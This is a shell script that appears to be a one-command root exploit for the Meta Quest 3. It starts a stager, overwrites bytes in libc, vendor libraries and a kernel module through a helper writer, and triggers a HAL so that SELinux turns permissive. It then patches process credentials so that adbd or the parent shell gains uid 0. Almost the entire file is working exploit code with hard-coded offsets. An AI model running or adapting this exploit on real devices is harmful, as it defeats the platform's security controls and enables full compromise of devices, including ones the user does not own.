#!/system/bin/sh
# V79 Quest 3 — One-command root
# Usage:
#   sh auto_root.sh         ← targets adbd (all adb shells become root)
#   sh auto_root.sh self    ← targets parent shell (for aShell/terminal apps)
trap '' HUP  # survive adb pty disconnect (trampoline fork children corrupt the stream)

TMP=/data/local/tmp
IV=$TMP/iv_table_256.bin
LIBC=/apex/com.android.runtime/lib64/bionic/libc.so
SDSPRPC=/vendor/lib64/libsdsprpc.so
VUDC=/vendor/lib/modules/usbip-vudc.ko
PORT_BASE=0x313DC
PID_OFF=0x468C
MODE=${1:-adbd}

mkbyte() {
    printf "\\$(printf '%03o' $(($1&255)))\\$(printf '%03o' $((($1>>8)&255)))\\$(printf '%03o' $((($1>>16)&255)))\\$(printf '%03o' $((($1>>24)&255)))\\$(printf '%03o' $(($2&255)))"
}

gen_port_spec() {
    PS=$(printf "%05d" $1); i=0
    while [ $i -lt 5 ]; do
        mkbyte $((PORT_BASE+i)) $(printf '%d' "'$(echo "$PS" | cut -c$((i+1))-$((i+1)))")
        i=$((i+1))
    done
}

gen_pid_spec() {
    I=$(($1<<5|0x52800000))
    mkbyte $PID_OFF $((I&255))
    mkbyte $((PID_OFF+1)) $(((I>>8)&255))
    mkbyte $((PID_OFF+2)) $(((I>>16)&255))
    mkbyte $((PID_OFF+3)) $(((I>>24)&255))
}

get_pe() { cat /proc/net/xfrm_stat | grep InStateProtoError | awk '{print $2}'; }

trigger_hal() {
    dumpsys input > /dev/null 2>&1
}

echo "=== V79 AUTO ROOT (mode=$MODE) ==="

# [1] Stager
for P in $(ps -A | grep app_process | grep -v grep | awk '{print $2}'); do kill $P 2>/dev/null; done
rm -f $TMP/_stager_out.txt
(trap '' HUP; exec app_process -cp $TMP/Stager.jar /system/bin q3.Stager 1800 </dev/null > $TMP/_stager_out.txt 2>&1) &
sleep 2
PORT=$(cat $TMP/_stager_out.txt | tr -d '\r' | grep "^ENCAPPORT=" | cut -d= -f2)
if [ -z "$PORT" ]; then echo "FAIL: no port"; exit 1; fi
echo "[1] port=$PORT"

# [2] Keeper + write Phase 1
while true; do
    dd if=$LIBC bs=4096 skip=140 count=1 >/dev/null 2>&1
    dd if=$LIBC bs=4096 skip=24 count=1 >/dev/null 2>&1
    dd if=$SDSPRPC bs=4096 skip=49 count=1 >/dev/null 2>&1
    dd if=/system/lib64/libandroid_servers.so bs=4096 skip=118 count=1 >/dev/null 2>&1
    dd if=/vendor/etc/init.insmod.cfg bs=4096 skip=0 count=1 >/dev/null 2>&1
    sleep 0.2
done &
K1=$!

gen_port_spec $PORT > $TMP/_port.spec

$TMP/ivm_writer $PORT $IV $LIBC $TMP/spec_libc_caves.bin 2>/dev/null &
W1=$!
$TMP/ivm_writer $PORT $IV \
    $SDSPRPC $TMP/spec_ivm_emb.bin \
    /system/lib64/libandroid_servers.so $TMP/spec_libas.bin \
    /vendor/etc/init.insmod.cfg $TMP/cfg_records.bin
wait $W1
$TMP/ivm_writer $PORT $IV $SDSPRPC $TMP/_port.spec
# Save stock rela bytes before overwriting (for restore after root)
# Read 3 bytes at 0x18F70 from stock libc, generate restore spec
B0=$(dd if=$LIBC bs=1 skip=$((0x18F70)) count=1 2>/dev/null | od -An -tu1 | tr -d ' ')
B1=$(dd if=$LIBC bs=1 skip=$((0x18F71)) count=1 2>/dev/null | od -An -tu1 | tr -d ' ')
B2=$(dd if=$LIBC bs=1 skip=$((0x18F72)) count=1 2>/dev/null | od -An -tu1 | tr -d ' ')
{ mkbyte 0x18F70 $B0; mkbyte 0x18F71 $B1; mkbyte 0x18F72 $B2; } > $TMP/_rela_stock.spec
$TMP/ivm_writer $PORT $IV $LIBC $TMP/spec_libc_rela.bin
echo "[2] Phase 1 written"

# [3] Trigger Phase 1
E=$(cat /sys/fs/selinux/enforce)
if [ "$E" = "0" ]; then
    echo "[3] Already Permissive"
else
    PE1=$(get_pe)
    trigger_hal
    # Poll PE (0.3s intervals, max 15s)
    i=0; while [ $i -lt 50 ]; do
        sleep 0.3; PE2=$(get_pe); D=$((PE2-PE1))
        [ $D -gt 10 ] && break
        i=$((i+1))
    done
    if [ $D -lt 10 ]; then
        echo "    retry trigger..."
        trigger_hal
        i=0; while [ $i -lt 30 ]; do
            sleep 0.3; PE2=$(get_pe); D=$((PE2-PE1))
            [ $D -gt 10 ] && break
            i=$((i+1))
        done
    fi
    # insmod immediately after payload done
    setprop ctl.start insmod_sh
    i=0; while [ $i -lt 15 ]; do
        sleep 0.3; E=$(cat /sys/fs/selinux/enforce)
        [ "$E" = "0" ] && break
        i=$((i+1))
    done
    i=0; while [ $i -lt 10 ]; do
        sleep 0.3; E=$(cat /sys/fs/selinux/enforce)
        [ "$E" = "0" ] && break
        i=$((i+1))
    done
    if [ "$E" != "0" ]; then echo "FAIL: enforce=$E PE+$D"; kill $K1; exit 1; fi
    echo "[3] Permissive (PE+$D)"
    # Revert libc rela to stock bytes (saved before rela was written)
    # Prevents trampoline fork() in subsequent adb shell sessions → adbd stays stable
    if [ -f "$TMP/_rela_stock.spec" ]; then
        $TMP/ivm_writer $PORT $IV $LIBC $TMP/_rela_stock.spec 2>/dev/null
        echo "[3b] libc rela reverted"
    fi
fi

# [4] Phase 2: cred_patch
if [ "$MODE" = "self" ]; then
    TARGET=$PPID
    echo "[4] target=\$PPID ($TARGET)"
else
    TARGET=$(ps -A | grep adbd | grep -v grep | awk '{print $2}' | head -1)
    echo "[4] target=adbd ($TARGET)"
fi

while true; do
    dd if=$VUDC bs=4096 skip=4 count=1 >/dev/null 2>&1
    dd if=$VUDC bs=4096 skip=9 count=1 >/dev/null 2>&1
    dd if=/vendor/etc/init.insmod.cfg bs=4096 skip=0 count=1 >/dev/null 2>&1
    sleep 0.2
done &
K2=$!

gen_pid_spec $TARGET > $TMP/_pid.spec
$TMP/ivm_writer $PORT $IV \
    $VUDC $TMP/spec_cred2.bin \
    /vendor/etc/init.insmod.cfg $TMP/cfg_records_vudc.bin
$TMP/ivm_writer $PORT $IV $VUDC $TMP/_pid.spec

setprop ctl.start insmod_sh
i=0; while [ $i -lt 10 ]; do
    sleep 0.3
    U=$(cat /proc/$TARGET/status 2>/dev/null | grep "^Uid:" | awk '{print $2}')
    [ "$U" = "0" ] && break
    i=$((i+1))
done

# Cleanup — do NOT kill stager (app_process): it shares the adb session,
# killing it closes the transport and restarts adbd. Let it timeout (1800s).
kill $K1 $K2 2>/dev/null
chmod 777 $TMP/auto_root.sh $TMP/ivm_writer $TMP/test_iv2 2>/dev/null
chmod 666 $TMP/iv_table_256.bin $TMP/spec_*.bin $TMP/cfg_records*.bin \
    $TMP/Stager.jar $TMP/_*.spec 2>/dev/null

if [ "$U" = "0" ]; then
    echo "=== ROOT OK (pid=$TARGET) ==="
else
    echo "FAIL: uid=$U"
    exit 1
fi

